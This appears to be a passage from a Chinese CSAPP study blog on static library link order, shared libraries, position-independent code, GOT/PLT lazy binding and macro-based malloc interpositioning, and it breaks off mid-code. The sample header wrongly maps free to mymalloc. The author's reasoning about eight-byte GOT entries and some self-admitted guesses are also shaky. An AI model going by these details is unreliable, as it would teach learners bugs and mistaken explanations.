<p><strong>1.</strong>当输入<code>gcc f1 f2 ... fn</code>之后,编译器首先将各个源文件编译为可重定位目标文件<code>.o</code>,已经是<code>.o</code>或者<code>.a</code>文件则跳过不编译,得到一个全都是<code>.o</code>或者<code>.a</code>的参数序列</p>
<p><strong>2.</strong>链接器从左向右扫描这些<code>.o</code>或者<code>.a</code>文件,这两种文件有不同的待遇.</p>
<blockquote>
<p>链接器会维护三个集合:</p>
<p>可重定位目标文件集合E</p>
<p>未解析符号集合U(undefined)</p>
<p>已定义符号集合D(defined)</p>
</blockquote>
<p><strong>3.</strong>如果链接器当前扫描到的文件是一个.o,则</p>
<blockquote>
<p>本.o文件添加到E集合</p>
<p>本.o文件中的定义放到D集合</p>
<p>本.o文件中的引用放到U集合</p>
</blockquote>
<p><strong>4.</strong>如果链接器当前扫描到的文件是一个.a,则</p>
<blockquote>
<p>遍历本.a文件中所有组成模块,寻找U中引用的定义模块,</p>
<p>如果找到则将该模块放到E,将该引用从U中去掉,将定义放到D中</p>
<p><strong>遍历完后本.a文件不再发挥作用</strong></p>
</blockquote>
<p><strong>5.</strong>当链接器扫描完了参数,此时检查U集合是否为空</p>
<blockquote>
<p>如果U非空则有未解析的引用,报错<code>undefined reference</code></p>
<p>如果U为空则连接成功,合并并重定位E中的模块,形成可执行目标文件</p>
</blockquote>
<p>链接结束</p>
<blockquote>
<p>注意第4条最后的"<strong>遍历完后本.a文件不再发挥作用</strong>"</p>
<p>这就要求命令行上的参数有顺序了</p>
<p>如果都是.o妹有.a,则所有.o的所有定义和引用都会被放在D和U中,不怕有遗漏的定义</p>
<p>但是如果有.a,则链接器扫描.a时,只负责解析先前存在在U中的引用,后面的目标模块它现在看都不看</p>
<p>比如假如参数序列是这样的:<code>gcc a.o b.o lib.a c.o</code></p>
<p>其中a,b,c中都有<code>lib.a</code>中的引用,并且</p>
<p><code>a.o</code>引用了<code>lib.a</code>中的<code>a</code>模块,</p>
<p><code>b.o</code>引用了<code>lib.a</code>中的<code>b</code>模块,</p>
<p><code>c.o</code>引用了<code>lib.a</code>中的<code>c</code>模块,</p>
<p>当链接器扫描到<code>lib.a</code>时,链接器会依据<code>lib.a</code>,解析<code>a.o</code>和<code>b.o</code>中的引用,但是链接器此时并不知道后面还有啥参数,在用<code>lib.a</code>解析了<code>a.o</code>和<code>b.o</code>之后就丢弃了<code>lib.a</code>的其他部分,</p>
<p>然后扫描<code>c.o</code>又有了新的引用,而此时链接器已经扫描到头了,找不到一个能给出定义的模块了</p>
<p>链接出错</p>
<p>这样设计虽然会因为顺序问题导致链接出错,但是注意一下或者多写几遍.a就可以克服.并且能够做到尽量少引入目标模块,非用不引.并且时间最优</p>
</blockquote>
<h3 id="动态库.so">动态库.so</h3>
<p>动态库又叫做共享目标文件</p>
<h4 id="起源-1">起源</h4>
<blockquote>
<p>静态库的缺点:</p>
<p>试想现在要同时运行多个进程,每个进程都要调用库函数<code>printf</code>,按照静态库的链接方法,每个进程的虚拟地址空间都会有一个printf
的拷贝,并且会物理地址空间上建立相应物理页</p>
<p>而实际上<code>printf</code>就是一段只读的代码,给定参数就可以当作黑盒用.</p>
<p>就像办公室的打印机,不同的用户只需要给定自己想要打印的材料,用同一台打印机就可以获得不同的输出</p>
</blockquote>
<p>在兼容静态库拿啥用啥的思想上,让只读的代码和数据不需要有多份拷贝,<strong>一份足矣</strong>,这就是动态库的思想.</p>
<p>动态库在<strong>运行或加载</strong>时,可以加载到<strong>任意地址</strong></p>
<p>在linux上动态库后缀.so,在windows上动态库后缀.dll</p>
<h4 id="动态库的链接">动态库的链接</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220526001100718.png"
alt="image-20220526001100718" />
<figcaption aria-hidden="true">image-20220526001100718</figcaption>
</figure>
<p>在链接阶段,动态库传递给链接器的只有重定位和符号表信息,并没有让只读代码段参与链接.</p>
<p>啥时候动态库中的只读代码才会参与链接呢?在执行过程中,首次用到了动态库中的引用时,不得不动态加载了,此时动态链接器才会将动态库映射到进程的地址空间,并进行重定位让悬空引用落地</p>
<blockquote>
<p>这个过程我没有亲眼见证,都是道听途说,暂且认为它是这样的</p>
</blockquote>
<p>为了让不同的进程都能将共享库的物理地址空间映射到自己的虚拟地址空间,有好多种办法</p>
<p>1.物理地址空间为共享库专门留出空间,一个萝卜一个坑,就算妹有萝卜,坑也得留着,其他代码数据都往后稍稍.用到该共享库的时候就一定加载到给他预留的物理地址空间.</p>
<blockquote>
<p>缺点是,程序不一定会用到该共享库,或者程序刚开始时只用到该共享库的一小部分代码,共享库只有一小部分加载进入物理地址空间.然后是其他代码,占用了为共享库预留的剩余空间,现在又要调用共享库中的其他代码,这时一开始预留的空间已经被占用,不够用了.又得重新找一个空旷的地方放动态库.这样重复多了,物理地址空间就变得呲离破碎,全是下脚料空间</p>
<p>这可能比静态库还要浪费物理内存,这不就废了吗</p>
</blockquote>
<p>2.位置无关代码</p>
<p>动态库可以任意加载进入物理地址空间,由动态链接器完成程序中动态库引用的解析</p>
<h4 id="使用动态库">使用动态库</h4>
<p>还是使用静态库时举的<code>geometry</code>的例子</p>
<p><code>makedynamiclib.sh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o libgeometry.so line.c point.c  #制作代码位置无关的共享库libgeometry.so</span><br><span class="line"></span><br><span class="line">gcc  main.c ./libgeometry.so -lm -o prog </span><br><span class="line"></span><br><span class="line">./prog</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/linkage]</span><br><span class="line">└─# ./makedynamiclib.sh</span><br><span class="line">euclidean_distance=2.83</span><br><span class="line">(4.00,5.00)(2.00,3.00)</span><br></pre></td></tr></table></figure>
<p>同时在工作目录下生成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libgeometry.so</span><br><span class="line">prog</span><br></pre></td></tr></table></figure>
<p>两个目标文件</p>
<p>使用ida64打开prog观察,发现函数少的可怜</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220526093938243.png"
alt="image-20220526093938243" />
<figcaption aria-hidden="true">image-20220526093938243</figcaption>
</figure>
<p>并且可以发现,在<code>point.c</code>中定义的<code>getManhattanDistance</code>并没有被解析.</p>
<p>即,使用动态库时引用解析是<strong>以函数为单位</strong>的,相对于以模块为单位进行解析的静态库更加灵活</p>
<p>以<code>getEuclideanDistance</code>为例,观察该函数引用是如何被解析的</p>
<p>在<code>main</code>函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000011EB                 call    _getEuclideanDistance</span><br></pre></td></tr></table></figure>
<p>跟踪<code>_getEuclideanDistance</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000001060 _getEuclideanDistance proc near         ; CODE XREF: main+82↓p</span><br><span class="line">.plt:0000000000001060                 jmp     cs:off_4030</span><br><span class="line">.plt:0000000000001060 _getEuclideanDistance endp</span><br></pre></td></tr></table></figure>
<p>跟踪<code>cs:off_4030</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000004030 off_4030        dq offset getEuclideanDistance</span><br><span class="line">.got.plt:0000000000004030                                         ; DATA XREF: _getEuclideanDistance↑r</span><br><span class="line">.got.plt:0000000000004030 _got_plt        ends</span><br><span class="line">.got.plt:0000000000004030</span><br></pre></td></tr></table></figure>
<p>跟踪<code>offset getEuclideanDistance</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extern:0000000000004078                 extrn getEuclideanDistance:near</span><br><span class="line">extern:0000000000004078                                         ; CODE XREF: _getEuclideanDistance↑j</span><br><span class="line">extern:0000000000004078                                         ; DATA XREF: .got.plt:off_4030↑o</span><br></pre></td></tr></table></figure>
<p>此时已经跟踪到头了,点谁都不会跳转了.但是自始至终妹有看见该函数的实现,好像一直在踢皮球</p>
<p>这涉及到位置无关代码PIC的理论</p>
<h4 id="位置无关代码pic">位置无关代码PIC</h4>
<p>Position-Independent Code</p>
<p>共享库在编译时要求必须使用位置无关选项<code>-fpic</code></p>
<h5 id="pic数据引用">PIC数据引用</h5>
<p>全局偏移量表global offset table,GOT</p>
<p>GOT位于<strong>数据段的开始</strong></p>
<p>编译时使用<code>-static</code>选项得到的可执行目标文件中是妹有GOT表的</p>
<p>只有使用位置无关代码的动态链接才会生成GOT表,即使就写一个空壳子main函数啥也不干,什么头文件也不导入,动态链接之后的可执行目标文件也是会有GOT的</p>
<h6 id="got表结构">GOT表结构:</h6>
<p>GOT表项八字节一个,表项内容是引用指向的地址,即一个位置无关代码在运行时的实际地址</p>
<blockquote>
<p>为什么是八字节?</p>
<p>八个字节即64位,考虑进程的虚拟地址空间有64位吗?</p>
<p><img
src="https://pic2.zhimg.com/v2-76f7edab5d8e719cc150fc382c18a10e_1440w.jpg?source=172ae18b" /></p>
<p>图片来自<a
target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/207001939">Linux内存管理：虚拟地址空间
- 知乎 (zhihu.com)</a></p>
<p>用户的虚拟地址空间只有48位,从<code>0x0</code>到<code>0xFFFF FFFF FFFF</code></p>
<p>内核的虚拟地址空间也是48位,从<code>0xFFFF 0000 0000 0000</code>到<code>0xFFFF FFFF FFFF FFFF</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Start                 End                     Size            Use</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">0000000000000000      0000ffffffffffff         256TB          user</span><br><span class="line">ffff000000000000      ffff7fffffffffff         128TB          kernel logical memory map</span><br><span class="line">ffff800000000000      ffff9fffffffffff          32TB          kasan shadow region</span><br><span class="line">ffffa00000000000      ffffa00007ffffff         128MB          bpf jit region</span><br><span class="line">ffffa00008000000      ffffa0000fffffff         128MB          modules</span><br><span class="line">ffffa00010000000      fffffdffbffeffff         ~93TB          vmalloc</span><br><span class="line">fffffdffbfff0000      fffffdfffe5f8fff        ~998MB          [guard region]</span><br><span class="line">fffffdfffe5f9000      fffffdfffe9fffff        4124KB          fixed mappings</span><br><span class="line">fffffdfffea00000      fffffdfffebfffff           2MB          [guard region]</span><br><span class="line">fffffdfffec00000      fffffdffffbfffff          16MB          PCI I/O space</span><br><span class="line">fffffdffffc00000      fffffdffffdfffff           2MB          [guard region]</span><br><span class="line">fffffdffffe00000      ffffffffffdfffff           2TB          vmemmap</span><br><span class="line">ffffffffffe00000      ffffffffffffffff           2MB          [guard region]</span><br></pre></td></tr></table></figure>
<p>如果GOT表项可以指向一个内核中的函数或者变量,则显然需要8字节的表项,</p>
<p>如果GOT表项只是指向用户模块中的变量或者函数,则只需要6字节(48位)的表项</p>
<p>因此问题转化为一个进程是否会访问内核</p>
<p>显然是可以的,比如系统调用</p>
</blockquote>
<h6 id="got表怎么干活的">GOT表怎么干活的?</h6>
<p>CSAPP上举了这么一个例子</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220526192907692.png"
alt="image-20220526192907137" />
<figcaption aria-hidden="true">image-20220526192907137</figcaption>
</figure>
<p>一定时刻记住以下几点:</p>
<p>1.代码段是c源代码经过<strong>编译</strong>得到的,与链接无关</p>
<p>2.本模块中引用了一个位于其它模块中的符号<code>addcnt</code>,本模块中妹有定义,因此编译器会为其生成一个<code>GOT</code>表项,又从代码段到数据段GOT的跳转需要重定位,因此汇编器会生成一个重定位条目,为静态链接器(相对动态链接器的说法)进行重定位做准备</p>
<p>3.编译阶段是不知道GOT表在哪里的(即使GOT表和代码段在同一模块中),汇编器只会生成重定位条目</p>
<p>4.静态链接阶段才会将代码段中对GOT的引用重定位,</p>
<p>5.静态链接后,在代码段只需要对GOT表的PC相对寻址,在实际运行时,由动态链接器去实际填充该表项应该指向的地址</p>
<blockquote>
<p>注意这里有两次引用,一是代码段引用数据段的GOT表,二是GOT表引用其他模块中的符号</p>
</blockquote>
<blockquote>
<p>GOT表的存在,相当于编译器和静态链接器给动态链接器减轻了负担,动态链接器不需要去代码段找需要解析的引用,只需要看看数据段的开头,就知道哪些引用需要解析</p>
<p>至于动态链接器是个啥,怎么工作的,现在不关心,就当是一个黑盒,它在程序运行阶段发挥作用,结果是给GOT表中的引用找到实际地址,填充到GOT表项</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R[%rax]&lt;---R[%rip]+0x2008b9=&amp;GOT[3]		//主存中GOT[3]的地址放到rax寄存器中</span><br><span class="line">M[R[%rax]]=M[R[%rip]+0x2008b9]=M[%GOT[3]]&lt;---M[%GOT[3]]+1			//解引用后+1再放回去</span><br></pre></td></tr></table></figure>
<h5 id="pic函数调用">PIC函数调用</h5>
<p>GOT和PLT协作</p>
<p>CSAPP教材上给出了看起来不长,却信息量巨大的图文,下面就这一段文字进行解读</p>
<figure>
<img
src="../../AppData/Roaming/Typora/typora-user-images/image-20220526201953361.png"
alt="image-20220526201953361" />
<figcaption aria-hidden="true">image-20220526201953361</figcaption>
</figure>
<h6 id="过程链接表plt">·过程链接表(PLT)</h6>
<p>1.PLT是一个数组,其中每个条目都是16字节的代码.</p>
<blockquote>
<p>PLT表:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000001020</span><br><span class="line">.plt:0000000000001020                               ; Segment type: Pure code	;段类型:纯代码</span><br><span class="line">.plt:0000000000001020                               ; Segment permissions: Read/Execute	;段权限:读/执行/不可写</span><br><span class="line">.plt:0000000000001020                               _plt            segment para public &#x27;CODE&#x27; use64</span><br><span class="line">.plt:0000000000001020                                               assume cs:_plt	;令cs段寄存器指向plt段</span><br><span class="line">.plt:0000000000001020                                               ;org 1020h</span><br><span class="line">.plt:0000000000001020                                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br></pre></td></tr></table></figure>
<p>PLT表的表项16字节一个,表项内容是<strong>代码(指令)</strong></p>
<p>比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;6字节</span><br><span class="line">.plt:0000000000001030                               _isPrime        proc near               ; CODE XREF: main+D↓p</span><br><span class="line">.plt:0000000000001030 FF 25 E2 2F 00 00                             jmp     cs:off_4018</span><br><span class="line">.plt:0000000000001030                               _isPrime        endp</span><br><span class="line"></span><br><span class="line">;10字节</span><br><span class="line">.plt:0000000000001036 68 00 00 00 00                                push    0</span><br><span class="line">.plt:000000000000103B E9 E0 FF FF FF                                jmp     sub_1020</span><br></pre></td></tr></table></figure>
<p>为什么是16字节?</p>
<p>有些指令长,有些指令短,有些plt条目中有多条指令</p>
<p>16字节应该是存在的最长的plt表项</p>
</blockquote>
<p>2.PLT[0]是一个特殊条目,它跳转到动态链接器中.</p>
<blockquote>
<p>1.动态链接器本身就是一个动态库中的函数,是位置无关代码.因此也需要借助GOT和PLT表跳转.</p>
<p>2.PLT表中不只有用户显示引用的动态库中的函数,还有用户妹有显示引用却不可或缺的动态库函数,比如动态链接器</p>
</blockquote>
<p>3.每个被可执行程序调用的库函数都有自己的PLT表条目.每个条目都负责一个具体的函数</p>
<p>不光调用<code>glibc.so</code>动态库中的函数比如<code>printf</code>时有PLT条目,调用自定义的动态库也会有PLT条目</p>
<blockquote>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">isPrime</span><span class="params">(<span class="type">int</span>)</span>;<span class="comment">//isPrime为自定义动态库libfunc.so中的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> ans=isPrime(<span class="number">510</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans);		<span class="comment">//printf为glibc.so中的函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>func.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isPrime</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&amp;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>制作动态库并链接,执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o libfunc.so func.c</span><br><span class="line"></span><br><span class="line">gcc -g main.c ./libfunc.so  -O0 -o prog </span><br></pre></td></tr></table></figure>
<p>使用ida64打开prog观察反汇编视图</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000001030 ; int printf(const char *format, ...)</span><br><span class="line">.plt:0000000000001030 _printf         proc near               ; CODE XREF: main+29↓p</span><br><span class="line">.plt:0000000000001030                 jmp     cs:off_4018</span><br><span class="line">.plt:0000000000001030 _printf         endp</span><br><span class="line">...</span><br><span class="line">.plt:0000000000001040 _isPrime        proc near               ; CODE XREF: main+D↓p</span><br><span class="line">.plt:0000000000001040                 jmp     cs:off_4020</span><br><span class="line">.plt:0000000000001040 _isPrime        endp</span><br></pre></td></tr></table></figure>
<p>都生成了plt条目</p>
</blockquote>
<h6 id="全局偏移量表got">·全局偏移量表(GOT)</h6>
<p>初始时,每个GOT条目都对应PLT条目的第二条指令</p>
<blockquote>
<p>这其实不是GOT的特性了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">main.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   55                      push   %rbp</span><br><span class="line">   1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   4:   48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">   8:   bf fe 01 00 00          mov    $0x1fe,%edi</span><br><span class="line">   d:   e8 00 00 00 00          call   12 &lt;main+0x12&gt;	//此处call的地址就在下一行啊</span><br><span class="line">  12:   89 45 fc                mov    %eax,-0x4(%rbp)</span><br><span class="line">  15:   8b 45 fc                mov    -0x4(%rbp),%eax</span><br><span class="line">  18:   89 c6                   mov    %eax,%esi</span><br><span class="line">  1a:   48 8d 05 00 00 00 00    lea    0x0(%rip),%rax        # 21 &lt;main+0x21&gt;</span><br><span class="line">  21:   48 89 c7                mov    %rax,%rdi</span><br><span class="line">  24:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  29:   e8 00 00 00 00          call   2e &lt;main+0x2e&gt;//此处call的地址就在下一行</span><br><span class="line">  2e:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  33:   c9                      leave</span><br><span class="line">  34:   c3                      ret</span><br></pre></td></tr></table></figure>
<p>由于编译器和静态链接器不能决定引用函数的具体地址,因此他俩只能摆烂.</p>
<p>动态链接器会把GOT指向的地址修改为动态库函数地址</p>
</blockquote>
<h5 id="举个例子">举个例子</h5>
<p>CSAPP举的例子</p>
<figure>
<img
src="../../AppData/Roaming/Typora/typora-user-images/image-20220526211008954.png"
alt="image-20220526211008954" />
<figcaption aria-hidden="true">image-20220526211008954</figcaption>
</figure>
<h6 id="首次调用addvec"><strong>首次调用addvec</strong></h6>
<p>1.<code>callq 0x4005c0 #call addvec()</code></p>
<p>该指令执行时会将该call指令的后一条指令的地址作为返回时的地址压栈,然后置<code>PC=0x0x4005c0</code>,然后转移控制</p>
<p>2.<code>0x4005c0  jmpq *GOT[4]</code></p>
<p>这里<code>*GOT[4]</code>不是汇编语言的写法,是编者方便读者理解,使用了C语言中数组的表示方法</p>
<p>这里的意思是,跳转到<code>GOT[4]</code>指向的地址(即<code>GOT[4]</code>表项中存放的地址),而不是跳转到<code>GOT[4]</code>的地址</p>
<blockquote>
<p>实际上是这种写法:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    1040:	ff 25 da 2f 00 00    	jmp    *0x2fda(%rip)        # 4020 &lt;isPrime@Base&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>间接跳转</p>
</blockquote>
<p>在第一次调用addvec时,<code>GOT[4]=0x4005c6</code>即<code>0x4005c0</code>的下一条地址</p>
<p>3.<code>pushq $0x1</code></p>
<p>CSAPP上对这条指令的解释是"把<code>addvec</code>的ID(0x1)压栈"</p>
<p>啥意思呢?</p>
<p>我的理解是,addvec是用户指定调用的第一条库函数(不包括编译器自己写上的动态链接器等隐式调用的函数),因此把1这个魔数压栈,压栈的目的是作为参数,接下来就要调用动态链接器了,因此传递1作为参数,告诉动态链接器应该动态链接的是用户调用的第一个库函数addvec</p>
<p>4.<code>pushq *GOT[1]</code></p>
<p><code>GOT[1]</code>存放的是<code>.reloc</code>节的首地址</p>
<p>联系刚才的<code>push $0x1</code>,可以猜测,<code>.reloc</code>是一个表,每一个表项对应一个需要重定位的库函数,其中第一条就是<code>addvec</code>的表项,然后动态链接器要用这个<code>0x1</code>去查<code>.reloc</code>表</p>
<p>5.<code>jmpq *GOT[2]</code></p>
<p><code>GOT[2]</code>存放的是动态链接器的地址,</p>
<p>用<code>jmpq GOT[2]</code>会跳转到<code>GOT[2]</code>,啥也不会发生</p>
<p>用<code>jmpq *GOT[2]</code>会跳转到<code>GOT[2]</code>的内容,也就是动态链接器的地址</p>
<p>为啥不用<code>call</code>指令调用,却用<code>jmpq</code>直接跳转到函数的开始呢?</p>
<p><code>call</code>指令需要将跳转前的下一条指令压栈作为返回地址,返回地址将会覆盖栈顶上用于动态链接器的参数.</p>
<p>而<code>jmpq</code>直接跳转到动态链接器,栈顶此时就是他要使用的参数</p>
<p>6.动态链接器会确定<code>.reloc</code>表中第一个库函数即<code>addvec</code>的运行时地址,然后用该地址改写<code>GOT[4]</code></p>
<blockquote>
<p>具体怎么查的addvec运行时地址,怎么改写的GOT[4],那是后话了,现在当成黑盒子用</p>
</blockquote>
<p>7.动态链接器将控制交给addvec,此时才开始真正执行<code>call addvec</code></p>
<h6 id="第二次调用addvec"><strong>第二次调用addvec</strong></h6>
<p>由于第一次调用addvec时,动态链接器已经将<code>GOT[4]</code>改写为正确的<code>addvec</code>运行时地址,现在调用就不会在请动态链接器出马了</p>
<p>在<code>jmpq *GOT[4]</code>之后就跳转到了<code>addvec</code>的首地址</p>
<p>这里不用call的原因是,这里就是想把控制交给addvec,不需要记录PLT表中的返回地址</p>
<p>在主函数调用addvec时已经<code>call addvec</code>了</p>
<blockquote>
<p>这有点类似于记忆化搜索</p>
<p>记忆数组对应GOT表</p>
<p>搜索函数对应动态链接器</p>
<p>第一次搜索前记忆数组都是空的,对应GOT表返回地址不正确</p>
<p>搜索到之后搜素函数会改写记忆数组相应元素,对应动态链接器会修改GOT表项为函数运行时地址</p>
<p>第二次搜索时如果记忆数组不为空则直接使用数组内容,不调用搜索函数,对应第二次调用函数时直接根据GOT表跳转</p>
</blockquote>
<h3 id="库打桩">库打桩</h3>
<blockquote>
<p>打桩:打桩，指把桩打进地里，使<a
target="_blank" rel="noopener" href="https://baike.baidu.com/item/建筑物/673834">建筑物</a>基础坚固。--百度百科</p>
</blockquote>
<p>很纳闷为什么library interpositioning要翻译成打桩</p>
<p>library interpositioning 库 插入</p>
<p>就是程序本来应该调用一个库函数却被劫持调用一个包装函数或者其他逻辑的函数.甚至不如叫"库劫持"更直观</p>
<h4 id="预编译时打桩">预编译时打桩</h4>
<p>使用宏定义劫持库函数</p>
<h5 id="main.c-2"><code>main.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span>				<span class="comment">//此处的&lt;malloc.h&gt;不一定就是glibc中的头文件,有可能是劫持使用的&quot;malloc.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> *p=<span class="built_in">malloc</span>(<span class="number">510</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果只是有这么一个<code>main.c</code>文件,
用<code>gcc main.c -o main</code>命令,编译链接之后所有都按部就班地发生,真正调用glibc库的malloc函数申请堆内存</p>
<p>下面给他劫持喽</p>
<h5 id="malloc.h"><code>malloc.h</code></h5>
<p>注意本头文件和库函数<code>malloc</code>声明所在的头文件<code>malloc.h</code>同名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MYMALLOC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYMALLOC</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> malloc(size) mymalloc(size)				<span class="comment">//宏定义劫持库函数</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> free(ptr) mymalloc(ptr)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *<span class="title function_">mymalloc</span><span class="params">(<span class="type">size_t</span>)</span>;			<span class="comment">//声明函数接口</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">myfree</span><span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h5 id="mymalloc.c"><code>mymalloc.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;malloc.h&quot;</span>				</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mymalloc</span><span class="params">(<span class="type">size_t</span>)</span>&#123;				<span class="comment">//mymalloc的实现</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc啥也不干&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 